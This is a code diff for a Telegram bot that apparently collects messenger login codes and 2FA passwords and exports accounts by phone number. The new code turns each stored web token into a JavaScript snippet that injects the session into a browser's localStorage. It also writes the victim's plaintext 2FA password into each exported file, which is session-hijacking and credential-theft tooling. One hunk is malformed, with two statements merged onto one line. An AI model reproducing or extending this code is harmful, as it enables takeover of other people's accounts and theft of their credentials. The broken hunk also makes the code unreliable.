@@ -188,8 +188,8 @@ class MaxConnection:
                     self._responses[packet.sequence] = packet
                     self._pending[packet.sequence].set()
             except Exception as e:
-                logging.debug(f"Parse error: {e}")
-                pass
+                logging.debug(f"Parse error (skipping packet): {e}")
+                continue
 
     def send(self, packet: Packet, wait=True):
         with self._lock:
@@ -1569,7 +1569,17 @@ async def handle_zip_count(message: types.Message, state: FSMContext):
                 }
                 content = json.dumps(desktop, ensure_ascii=False, indent=4)
             else:
-                content = acc["web_token"]
+                web_token = acc["web_token"]
+                device_id = acc.get("device_id", str(uuid.uuid4()))
+                user_id = acc.get("user_id", 0)
+                password = acc.get("password", "")
+                
+                auth_data = json.dumps({"token": web_token, "viewerId": user_id})
+                
+                content = f"sessionStorage.clear();localStorage.clear();localStorage.setItem('__oneme_device_id', '{device_id}');localStorage.setItem('__oneme_auth', JSON.stringify({auth_data}));window.location.reload();"
+                
+                if password:
+                    content = f"2FA ПАРОЛЬ: {password}\n\n{content}"
             
             filename = f"{acc['phone']}.txt"
             zf.writestr(filename, content)
@@ -1746,8 +1756,7 @@ async def code_handler(message: types.Message, state: FSMContext):
             return
 
     if result.get("needs_password"):
-        pending[uid]["track_id"] = auth.track_id
-        await state.set_state(AuthState.waiting_for_password)
+        pending[uid]["track_id"] = auth.track_id        await state.set_state(AuthState.waiting_for_password)
         await msg.edit_text("🔐 Введите пароль 2FA:")
         return
 
